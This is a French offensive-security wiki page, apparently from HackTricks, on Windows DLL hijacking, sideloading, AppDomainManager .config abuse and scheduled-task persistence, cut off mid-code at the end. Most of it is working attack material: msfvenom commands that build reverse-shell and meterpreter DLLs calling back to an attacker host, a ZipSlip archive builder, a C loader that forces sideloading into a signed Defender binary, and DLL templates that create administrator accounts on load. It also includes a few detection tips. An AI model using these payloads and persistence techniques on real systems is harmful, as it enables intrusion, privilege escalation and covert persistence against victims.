# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informations de base

Le DLL Hijacking consiste à manipuler une application de confiance pour qu'elle charge une DLL malveillante. Ce terme englobe plusieurs tactiques comme le **DLL Spoofing, l'Injection et le Side-Loading**. Il est principalement utilisé pour l'exécution de code, la persistance et, plus rarement, l'élévation de privilèges. Malgré l'accent mis ici sur l'élévation de privilèges, la méthode de détournement reste la même, quels que soient les objectifs.

### Techniques courantes

Plusieurs méthodes sont utilisées pour le DLL Hijacking, chacune étant plus ou moins efficace selon la stratégie de chargement des DLL de l'application :<sup>[[4]](#references)</sup>

1. **DLL Replacement** : remplacer une DLL authentique par une DLL malveillante, éventuellement en utilisant le DLL Proxying pour préserver les fonctionnalités de la DLL d'origine.
2. **DLL Search Order Hijacking** : placer la DLL malveillante dans un chemin de recherche prioritaire par rapport à la DLL légitime, en exploitant l'ordre de recherche de l'application.
3. **Phantom DLL Hijacking** : créer une DLL malveillante que l'application chargera en pensant qu'il s'agit d'une DLL requise, mais inexistante.
4. **DLL Redirection** : modifier des paramètres de recherche comme `%PATH%` ou les fichiers `.exe.manifest` / `.exe.local` pour diriger l'application vers la DLL malveillante.
5. **WinSxS DLL Replacement** : remplacer la DLL légitime par une version malveillante dans le répertoire WinSxS ; cette méthode est souvent associée au DLL side-loading.
6. **Relative Path DLL Hijacking** : placer la DLL malveillante dans un répertoire contrôlé par l'utilisateur avec l'application copiée, selon une méthode proche des techniques de Binary Proxy Execution.

Une application peut également implémenter son **propre chargeur de DLL**. Un processus privilégié peut parcourir un répertoire enfant tel que `Libraries` ou `Plugins` et transmettre une DLL sélectionnée à un utilitaire, indépendamment de l'ordre de recherche normal des DLL Windows. Si un autre compte peut créer des fichiers dans ce répertoire précis, considérez cela comme une piste à examiner : confirmez l'identité du processus, les ACL effectives du répertoire, la règle de sélection des fichiers et l'existence d'une opération de chargement accessible. Le fait qu'un répertoire accessible en écriture se trouve à côté d'un exécutable ne prouve pas que le processus y charge des DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + assembly de l'attaquant)

Le DLL sideloading classique n'est pas le seul moyen de faire charger du code de l'attaquant par un processus **.NET Framework** de confiance. Si l'exécutable cible est une application **managée**, le CLR consulte également un **fichier de configuration de l'application** portant le nom de l'exécutable (par exemple `Setup.exe.config`). Ce fichier peut définir un **AppDomainManager** personnalisé. Si la configuration pointe vers un assembly contrôlé par l'attaquant, placé à côté de l'EXE, le CLR le charge **avant le chemin d'exécution normal de l'application** et l'exécute dans le processus de confiance.<sup>[[24]](#references)</sup>

Selon le schéma de configuration .NET Framework de Microsoft, `<appDomainManagerAssembly>` et `<appDomainManagerType>` doivent tous deux être présents pour que le gestionnaire personnalisé soit utilisé.<sup>[[16]](#references)[[17]](#references)</sup>

Configuration minimale :

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestionnaire minimal :

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Notes pratiques :
- Il s’agit d’une technique de **tradecraft spécifique à .NET Framework**. Elle repose sur l’analyse de la configuration du CLR, et non sur l’ordre de recherche des DLL Win32.
- L’hôte doit réellement être un **EXE managé**. Pour un triage rapide : `sigcheck -m target.exe`, `corflags target.exe`, ou vérifiez la présence du **CLR Runtime Header** dans les métadonnées PE.
- Le nom du fichier de configuration doit correspondre exactement à celui de l’exécutable (`<binary>.config`) et se trouve généralement **à côté de l’EXE**.
- Cette technique est utile avec des **binaires Microsoft/fournisseur signés**, car l’EXE de confiance reste intact tandis que l’assembly managé malveillant s’exécute dans le processus.
- Si vous disposez déjà d’un répertoire d’installation/de mise à jour accessible en écriture, le détournement d’AppDomainManager peut servir de **première étape**, suivie d’un sideloading classique de DLL ou d’un chargement réflectif pour les étapes ultérieures.

### AppDomainManager comme téléchargeur et amorçage par tâche planifiée

Un schéma d’intrusion pratique consiste à associer l’EXE managé de confiance à un fichier `*.config` malveillant et à une DLL AppDomainManager malveillante qui sert uniquement de **petit bootstrapper** :<sup>[[25]](#references)</sup>

1. L’utilisateur lance un installateur ou un programme de mise à jour .NET signé depuis un emplacement plausible tel que `%USERPROFILE%\Downloads`.
2. Le fichier de configuration adjacent amène le CLR à charger l’assembly de l’attaquant **avant le démarrage de la logique de l’application légitime**.
3. Le gestionnaire malveillant effectue un **path gate** (par exemple, ne poursuivre que si l’EXE hôte s’exécute depuis `Downloads`, et n’autoriser l’exécution de la seconde étape que depuis `%LOCALAPPDATA%`).
4. Si la vérification réussit, il télécharge le véritable payload dans un chemin accessible en écriture par l’utilisateur, tel que `%LOCALAPPDATA%\PerfWatson2.exe`, puis installe la persistance avec une tâche planifiée.

Pourquoi cette variante est importante :
- L’EXE hôte signé reste inchangé ; un triage qui ne calcule le hash que du binaire principal peut donc ne pas détecter la compromission.
- Les mesures simples d’**anti-analyse fondées sur le chemin** sont courantes : déplacer le trio ZIP/EXE/DLL vers Desktop, Temp ou un chemin de sandbox peut intentionnellement interrompre la chaîne.
- La DLL AppDomainManager de première étape peut rester minuscule et discrète, tandis que le véritable implant est récupéré ultérieurement.

Exemple minimal de persistance fréquemment observé avec ce schéma :

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes :
- ` /rl highest` signifie **le niveau le plus élevé disponible** pour cet utilisateur/cette session ; cela ne garantit pas à lui seul une élévation SYSTEM.
- Cette technique est souvent mieux classée comme **exécution/persistance via un abus de la configuration .NET** que comme un détournement classique de l’ordre de recherche d’une DLL manquante, même si les opérateurs combinent souvent les deux.

Pistes de détection :
- Exécutables .NET signés lancés depuis des **chemins d’extraction ZIP**, `Downloads`, `%TEMP%` ou d’autres dossiers accessibles en écriture par l’utilisateur, avec un fichier `<exe>.config` **dans le même répertoire**.
- Nouvelles tâches planifiées dont l’action pointe vers `%LOCALAPPDATA%`, `%APPDATA%` ou `Downloads`, et dont les noms imitent ceux de programmes de mise à jour de navigateurs ou de fournisseurs.
- Processus d’amorçage managés de courte durée qui téléchargent immédiatement un autre EXE, puis lancent `schtasks.exe`.
- Échantillons qui se terminent prématurément, sauf si le chemin de l’exécutable correspond à un répertoire attendu du profil utilisateur.

### Détourner une tâche planifiée existante pour relancer la chaîne de sideload

Pour assurer la persistance, ne cherchez pas uniquement à **créer une nouvelle tâche**. Certains groupes d’intrusion attendent qu’un installateur légitime crée une **tâche de mise à jour normale**, puis **réécrivent l’action de la tâche**, afin que le nom, l’auteur et le déclencheur existants restent familiers aux défenseurs.

Procédure réutilisable :
1. Installez/lancez le logiciel légitime et identifiez la tâche qu’il crée normalement.
2. Exportez le XML de la tâche et notez les valeurs actuelles de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Remplacez uniquement l’action afin que la tâche lance votre **EXE hôte de confiance** depuis un répertoire de staging accessible en écriture par l’utilisateur ; celui-ci effectue ensuite le sideload ou charge le véritable payload via AppDomain.
4. Réenregistrez la tâche sous le même nom au lieu de créer un nouvel artefact de persistance évident.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Pourquoi c’est plus discret :
- Le nom de la tâche peut toujours sembler légitime (par exemple, celui d’un outil de mise à jour d’un fournisseur).
- Le **service Planificateur de tâches** la lance ; la validation du parent ou des ancêtres voit donc souvent la chaîne de planification attendue au lieu de `explorer.exe`.
- Les équipes DFIR qui recherchent uniquement les **nouveaux noms de tâches** peuvent passer à côté d’une tâche déjà enregistrée dont l’action pointe désormais vers `%LOCALAPPDATA%`, `%APPDATA%` ou un autre chemin contrôlé par l’attaquant.

Points de recherche rapides :
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Comparez le XML de `C:\Windows\System32\Tasks\*` et les métadonnées de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` à une référence.
- Déclenchez une alerte lorsqu’une **tâche de mise à jour ressemblant à celle d’un fournisseur** s’exécute depuis des **répertoires accessibles en écriture par l’utilisateur** ou lance un EXE .NET accompagné d’un fichier `*.config`.

> [!TIP]
> Pour découvrir une chaîne détaillée combinant le staging HTML, des configurations AES-CTR et des implants .NET avec le DLL sideloading, consultez le workflow ci-dessous.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Détection des DLL manquantes

La méthode la plus courante pour trouver les DLL manquantes sur un système consiste à lancer [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de Sysinternals et à **définir les 2 filtres suivants** :

![Techniques courantes - Détection des DLL manquantes : la méthode la plus courante pour trouver les DLL manquantes sur un système consiste à lancer procmon de Sysinternals et à définir les 2 filtres suivants](<../../../images/image (961).png>)

![Techniques courantes - Détection des DLL manquantes : la méthode la plus courante pour trouver les DLL manquantes sur un système consiste à lancer procmon de Sysinternals et à définir les 2 filtres suivants](<../../../images/image (230).png>)

et à afficher uniquement **File System Activity** :

![Techniques courantes - Détection des DLL manquantes : et afficher uniquement File System Activity](<../../../images/image (153).png>)

Si vous recherchez des **DLL manquantes en général**, laissez l’outil tourner pendant **quelques secondes**.\
Si vous recherchez une **DLL manquante dans un exécutable précis**, ajoutez un filtre comme **"Process Name" "contains" `<exec name>`**, exécutez-le, puis arrêtez la capture des événements.<sup>[[9]](#references)</sup>

## Exploitation des DLL manquantes

Pour élever vos privilèges, recherchez une **DLL qu’un processus privilégié tente de charger** depuis un emplacement où vous pouvez écrire. Cela peut se produire si vous contrôlez un répertoire recherché avant celui qui contient la DLL légitime, ou si la DLL demandée n’existe pas et que vous pouvez écrire dans l’un des répertoires recherchés.

### Ordre de recherche des DLL

**La** [**documentation Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **explique précisément comment les DLL sont chargées.**

Les **applications Windows** recherchent les DLL en suivant un ensemble de **chemins prédéfinis**, dans un ordre précis. Le détournement de DLL devient possible lorsqu’une DLL malveillante est placée stratégiquement dans l’un de ces répertoires, afin qu’elle soit chargée avant la DLL authentique. Pour éviter cela, l’application doit utiliser des chemins absolus lorsqu’elle référence les DLL dont elle a besoin.

Voici l’**ordre de recherche des DLL sur les systèmes 32 bits** :

1. Le répertoire depuis lequel l’application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire.(_C:\Windows\System32_)
3. Le répertoire système 16 bits. Aucune fonction ne permet d’obtenir son chemin, mais il est tout de même recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
   1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires répertoriés dans la variable d’environnement PATH. Notez que cela n’inclut pas le chemin propre à l’application spécifié par la clé de registre **App Paths**. La clé **App Paths** n’est pas utilisée pour calculer le chemin de recherche des DLL.

Il s’agit de l’ordre de recherche **par défaut** lorsque **SafeDllSearchMode** est activé. Lorsqu’il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et définissez-la sur 0 (elle est activée par défaut).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD_WITH_ALTERED_SEARCH_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, une DLL peut être chargée en utilisant son chemin absolu plutôt que son nom. Dans ce cas, Windows recherche la DLL elle-même uniquement à cet emplacement ; les dépendances demandées par leur nom suivent toujours l’ordre de recherche applicable.

Il existe d’autres façons de modifier l’ordre de recherche, mais je ne vais pas les expliquer ici.

### Enchaîner une écriture arbitraire de fichier avec un détournement de DLL manquante

**Technique associée :** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Utilisez les filtres **ProcMon** (`Process Name` = EXE cible, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) pour relever les noms des DLL recherchées mais introuvables par le processus.<sup>[[14]](#references)</sup>
2. Si le binaire est exécuté selon une **planification ou par un service**, déposer une DLL portant l’un de ces noms dans le **répertoire de l’application** (première entrée de l’ordre de recherche) permettra son chargement lors de la prochaine exécution. Dans un cas impliquant un scanner .NET, le processus recherchait `hostfxr.dll` dans `C:\samples\app\` avant de charger la copie légitime depuis `C:\Program Files\dotnet\fxr\...`.
3. Créez une DLL de payload (par exemple, un reverse shell) avec n’importe quelle exportation : `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si votre primitive est une **écriture arbitraire de type ZipSlip**, créez un fichier ZIP dont une entrée sort du répertoire d’extraction afin que la DLL soit déposée dans le répertoire de l’application :

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Déposez l’archive dans la boîte de réception/le partage surveillé ; lorsque la tâche planifiée relance le processus, celui-ci charge la DLL malveillante et exécute votre code en tant que compte de service.

### Forcer le sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Une méthode avancée pour influencer de manière déterministe le chemin de recherche des DLL d’un nouveau processus consiste à définir le champ DllPath dans RTL_USER_PROCESS_PARAMETERS lors de la création du processus avec les API natives de ntdll. En indiquant ici un répertoire contrôlé par l’attaquant, un processus cible qui résout une DLL importée par son nom (sans chemin absolu et sans utiliser les indicateurs de chargement sécurisé) peut être forcé à charger une DLL malveillante depuis ce répertoire.

Idée clé
- Créez les paramètres du processus avec RtlCreateProcessParametersEx et indiquez un DllPath personnalisé pointant vers votre dossier contrôlé (par exemple, le répertoire où se trouvent votre dropper/unpacker).
- Créez le processus avec RtlCreateUserProcess. Lorsque le binaire cible résout une DLL par son nom, le chargeur consulte le DllPath fourni lors de la résolution, ce qui permet un sideloading fiable même si la DLL malveillante ne se trouve pas à côté de l’EXE cible.

Remarques/limitations
- Cela affecte le processus enfant en cours de création ; c’est différent de SetDllDirectory, qui n’affecte que le processus actuel.
- La cible doit importer une DLL ou appeler LoadLibrary en indiquant son nom (sans chemin absolu et sans utiliser LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Les KnownDLLs et les chemins absolus codés en dur ne peuvent pas être détournés. Les exports forwardés et SxS peuvent modifier l’ordre de priorité.

Exemple C minimal (ntdll, chaînes larges, gestion des erreurs simplifiée) :

<details>
<summary>Exemple C complet : forcer le sideloading d’une DLL via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Exemple d’utilisation opérationnelle
- Placez un xmllite.dll malveillant (qui exporte les fonctions requises ou sert de proxy vers le fichier réel) dans votre répertoire DllPath.
- Lancez un binaire signé connu pour rechercher xmllite.dll par nom à l’aide de la technique ci-dessus. Le chargeur résout l’import via le DllPath fourni et effectue le sideloading de votre DLL.

Cette technique a été observée dans la nature pour déclencher des chaînes de sideloading à plusieurs étapes : un launcher initial dépose une DLL auxiliaire, qui lance ensuite un binaire signé par Microsoft et vulnérable au détournement, avec un DllPath personnalisé afin de forcer le chargement de la DLL de l’attaquant depuis un répertoire de staging.<sup>[[6]](#references)</sup>


### Détournement d’AppDomainManager .NET via `.exe.config`

Pour les cibles **.NET Framework**, le sideloading peut être effectué **avant `Main()`** sans modifier la mémoire, en exploitant le fichier **`.exe.config`** adjacent à l’application. Au lieu de se fier uniquement à l’ordre de recherche des DLL Win32, l’attaquant place un EXE .NET légitime à côté d’un fichier de configuration malveillant et d’un ou plusieurs assemblies sous son contrôle.

Fonctionnement de la chaîne :<sup>[[15]](#references)[[22]](#references)</sup>
1. L’EXE hôte démarre et le **CLR lit `<exe>.config`**.
2. Le fichier de configuration définit **`<appDomainManagerAssembly>`** et **`<appDomainManagerType>`** afin que le runtime instancie un `AppDomainManager` contrôlé par l’attaquant.
3. Le gestionnaire malveillant obtient une **exécution avant `Main()`** dans le processus hôte de confiance.
4. Le même fichier de configuration peut obliger le CLR à rechercher d’abord les assemblies locaux (par exemple `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) et affaiblir la validation et la télémétrie du runtime sans patch inline.

Modèle de type campagne (l’imbrication exacte peut varier selon la directive et la version du CLR) :

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Pourquoi c’est utile :
- **`<probing privatePath="."/>`** maintient la résolution des assemblys dans le répertoire de l’application, faisant de ce dossier une surface de sideloading prévisible.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** transfèrent l’exécution vers le code de l’attaquant pendant l’initialisation du CLR, avant que la logique légitime de l’application ne s’exécute.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** peut permettre à une application full-trust de charger des assemblys non signés ou altérés sans échec de validation du strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** évite les redirections de publisher policy vers des assemblys plus récents.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rend la sélection du runtime plus déterministe.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** est particulièrement intéressant, car le **CLR désactive sa propre visibilité ETW** à partir de la configuration, plutôt que de modifier en mémoire `EtwEventWrite` dans l’implant.

Schéma opérationnel observé dans des campagnes récentes :
- Étape 1 : déposer `setup.exe`, `setup.exe.config` et des assemblys locaux.
- Étape 2 : les copier dans un dossier **AppData update** crédible, renommer l’hôte en quelque chose comme `update.exe`, puis le relancer via une **tâche planifiée**.
- Étape 3 : vérifier le contexte d’exécution (par exemple, que le parent attendu est `svchost.exe` lancé par Task Scheduler) avant de charger le RAT DLL/export final.

Pistes de détection :
- Des exécutables **.NET** signés ou autrement légitimes qui s’exécutent avec des fichiers **`.config`** suspects à proximité, dans des emplacements accessibles en écriture aux utilisateurs.
- Des fichiers `.config` contenant **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ou **`etwEnable enabled="false"`**.
- Des tâches planifiées qui relancent des binaires de mise à jour renommés depuis **`%LOCALAPPDATA%`** ou des répertoires `\bin\update\` propres à une application.
- Des chaînes parent/enfant où une tâche planifiée lance un hôte .NET de confiance qui charge immédiatement des assemblys non fournis par l’éditeur depuis son propre répertoire.

#### Exceptions à l’ordre de recherche des DLL dans la documentation Windows

La documentation Windows mentionne certaines exceptions à l’ordre de recherche standard des DLL :

- Lorsqu’une **DLL portant le même nom qu’une DLL déjà chargée en mémoire** est rencontrée, le système contourne la recherche habituelle. Il vérifie plutôt s’il existe une redirection et un manifeste avant d’utiliser par défaut la DLL déjà en mémoire. **Dans ce scénario, le système ne recherche pas la DLL**.
- Si la DLL est reconnue comme une **DLL connue** pour la version actuelle de Windows, le système utilise sa version de cette DLL connue, ainsi que toutes ses DLL dépendantes, **sans effectuer de recherche**. La clé de registre **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contient une liste de ces DLL connues.
- Si une **DLL a des dépendances**, la recherche de ces DLL dépendantes s’effectue comme si elles étaient indiquées uniquement par leur **nom de module**, que la DLL initiale ait été identifiée par un chemin complet ou non.

### Élévation de privilèges

**Conditions requises** :

- Identifier un processus qui s’exécute ou s’exécutera avec des **privilèges différents** (mouvement horizontal ou latéral) et auquel il **manque une DLL**.
- Vérifier que vous disposez d’un **accès en écriture** à l’un des **répertoires** dans lesquels la **DLL** sera **recherchée**. Il peut s’agir du répertoire de l’exécutable ou d’un répertoire inclus dans le chemin système.

Ces conditions préalables sont rarement réunies par défaut : les exécutables privilégiés n’ont généralement pas de dépendances DLL manquantes, et les utilisateurs standard ne peuvent normalement pas écrire dans les répertoires du chemin de recherche système. Des environnements mal configurés peuvent toutefois réunir ces deux conditions.\
Si ces conditions sont réunies, consultez le projet [UACME](https://github.com/hfiref0x/UACME). Bien que son objectif principal soit le contournement de l’UAC, il contient des PoC de DLL hijacking pour certaines versions de Windows, qui peuvent souvent être adaptés au répertoire accessible en écriture que vous avez trouvé.

Notez que vous pouvez **vérifier vos permissions dans un dossier** en exécutant :<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Et **vérifiez les permissions de tous les dossiers dans PATH** :

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Vous pouvez également vérifier les imports d’un exécutable et les exports d’une DLL avec :

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

For a guide complet sur la façon d’**abuser du DLL Hijacking pour obtenir une élévation de privilèges** avec des permissions d’écriture dans un **dossier du chemin système**, consultez :


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Outils automatisés

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d’écriture sur un dossier situé dans le PATH système.\
D’autres outils automatisés intéressants pour détecter cette vulnérabilité sont les fonctions **PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll._

### Exemple

Si vous trouvez un scénario exploitable, l’un des éléments les plus importants pour réussir l’exploitation est de **créer une DLL qui exporte au moins toutes les fonctions que l’exécutable importera depuis cette DLL**. Notez toutefois que le DLL Hijacking est pratique pour [passer du niveau d’intégrité Medium au niveau High **(en contournant l’UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou du niveau[ **d’intégrité High au niveau SYSTEM**](../index.html#from-high-integrity-to-system)**.** Vous trouverez un exemple expliquant **comment créer une DLL valide** dans cette étude sur le DLL Hijacking, axée sur l’exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous trouverez des **codes DLL de base** qui peuvent être utiles comme **modèles** ou pour créer une **DLL exportant des fonctions non requises**.

## **Création et compilation de DLL**

### **DLL Proxifying**

En gros, une **DLL proxy** est une DLL capable d’**exécuter votre code malveillant lors de son chargement**, tout en **exposant** les fonctions et en **fonctionnant** comme **prévu**, en **relayant tous les appels vers la bibliothèque réelle**.

Avec l’outil [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus), vous pouvez **indiquer un exécutable et sélectionner la bibliothèque** à proxifier, puis **générer une DLL proxifiée**, ou **indiquer la DLL** et **générer une DLL proxifiée**.

### **Meterpreter**

**Obtenir un shell inversé (x64) :**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obtenir un meterpreter (x86) :**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Créer un utilisateur (x86, je n’ai pas trouvé de version x64) :**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### La vôtre

Dans de nombreux cas, la DLL que vous compilez doit **exporter toutes les fonctions importées par le processus victime**. Si une exportation requise est absente, le binaire ne peut pas la résoudre et l’exploit échoue.

<details>
<summary>Modèle de DLL C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Exemple de DLL C++ avec création d’utilisateur</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternative avec point d’entrée de thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
